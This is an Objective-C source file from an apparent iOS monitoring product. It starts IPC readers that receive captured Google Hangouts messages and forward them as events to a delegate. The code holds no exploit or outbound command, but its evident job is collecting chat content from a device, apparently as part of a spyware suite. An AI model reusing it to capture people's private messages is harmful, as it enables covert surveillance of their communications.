//
//  HangoutCaptureManager.m
//  HangoutCaptureManager
//
//  Created by Ophat Phuetkasickonphasutha on 3/19/14.
//  Copyright 2014 __MyCompanyName__. All rights reserved.
//

#import "HangoutCaptureManager.h"

#import "DefStd.h"
#import "FxIMEvent.h"
#import "FxIMEventUtils.h"
#import <UIKit/UIKit.h>

@implementation HangoutCaptureManager

@synthesize mEventDelegate;
- (id) init {
	if ((self = [super init])) {
	}
	return (self);
}

- (void) registerEventDelegate: (id <EventDelegate>) aEventDelegate {
	[self setMEventDelegate:aEventDelegate];
}

- (void) unregisterEventDelegate {
	[self setMEventDelegate:nil];
}

- (void) startCapture {
	DLog (@"Start capture Hangout messenger");
	if (!mMessagePortReader) {
		mMessagePortReader = [[MessagePortIPCReader alloc] initWithPortName:kHangoutMessagePort
												 withMessagePortIPCDelegate:self];
		[mMessagePortReader start];
	}
	if (!mMessagePortReader1) {
		mMessagePortReader1 = [[MessagePortIPCReader alloc] initWithPortName:kHangoutMessagePort1
												  withMessagePortIPCDelegate:self];
		[mMessagePortReader1 start];
	}
	if (!mMessagePortReader2) {
		mMessagePortReader2 = [[MessagePortIPCReader alloc] initWithPortName:kHangoutMessagePort2
												  withMessagePortIPCDelegate:self];
		[mMessagePortReader2 start];
	}
    
    if ([[[UIDevice currentDevice] systemVersion] intValue] >= 7) {
		if (mSharedFileReader1 == nil) {
			mSharedFileReader1 = [[SharedFile2IPCReader alloc] initWithSharedFileName:kHangoutMessagePort
																		 withDelegate:self];
			[mSharedFileReader1 start];
		}
	}
}

- (void) stopCapture {
	DLog (@"Stop capture Hangout messenger");
	if (mMessagePortReader) {
		[mMessagePortReader stop];
		[mMessagePortReader release];
		mMessagePortReader = nil;
	}
	if (mMessagePortReader1) {
		[mMessagePortReader1 stop];
		[mMessagePortReader1 release];
		mMessagePortReader1 = nil;
	}
	if (mMessagePortReader2) {
		[mMessagePortReader2 stop];
		[mMessagePortReader2 release];
		mMessagePortReader2 = nil;
	}
    
    if (mSharedFileReader1 != nil) {
		[mSharedFileReader1 stop];
		[mSharedFileReader1 release];
		mSharedFileReader1 = nil;
	}
}

- (void) dataDidReceivedFromMessagePort: (NSData*) aRawData {
	NSKeyedUnarchiver *unarchiver = [[NSKeyedUnarchiver alloc] initForReadingWithData:aRawData];
    FxIMEvent *imEvent = [unarchiver decodeObjectForKey:kHangoutArchied];
	DLog(@"Hangout - imEvent = %@", imEvent);
    [unarchiver finishDecoding];	
	
	if ([mEventDelegate respondsToSelector:@selector(eventFinished:)]) {		
		NSArray *imStructureEvents = [FxIMEventUtils digestIMEvent:imEvent];	
		for (FxEvent *imStructureEvent in imStructureEvents) {	
			DLog (@"sending %@ ...", imStructureEvent);
			[mEventDelegate performSelector:@selector(eventFinished:) withObject:imStructureEvent];				
		}
	}
	
	[unarchiver release];
}

- (void) dataDidReceivedFromSharedFile2: (NSData*) aRawData {
	[self dataDidReceivedFromMessagePort:aRawData];
}

- (void) dealloc {
	[self stopCapture];
	[super dealloc];
}

@end

